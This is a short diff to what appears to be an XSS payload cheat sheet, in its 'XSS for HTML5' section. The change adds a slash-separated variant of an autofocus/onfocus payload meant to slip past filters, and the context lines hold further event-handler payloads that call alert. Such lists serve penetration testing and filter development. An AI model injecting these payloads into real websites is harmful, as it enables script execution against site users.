@@ -103,7 +103,7 @@ XSS for HTML5
 
 ```javascript
 <body onload=alert(/XSS/.source)>
-<input autofocus onfocus=alert(1)>
+<input autofocus/onfocus=alert(1)>
 <select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>
 <keygen autofocus onfocus=alert(1)>
